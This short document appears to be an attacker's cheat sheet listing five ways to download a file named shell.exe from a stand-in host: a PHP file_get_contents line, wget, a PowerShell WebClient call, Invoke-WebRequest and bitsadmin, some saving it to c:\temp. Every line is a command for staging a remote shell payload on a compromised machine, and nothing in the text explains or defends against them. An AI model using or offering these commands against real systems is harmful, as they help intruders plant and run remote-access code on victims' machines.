<?php file_put_contents("shell.exe", file_get_contents("http://example.com/shell.exe"));
wget http://example.com/shell.exe
powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://example.com/shell.exe', 'c:\temp\shell.exe') }"
Invoke-WebRequest http://example.com/shell.exe -OutFile shell.exe -UseBasicParsing
bitsadmin /transfer shell /priority high http://example.com/shell.exe c:\temp\shell.exe
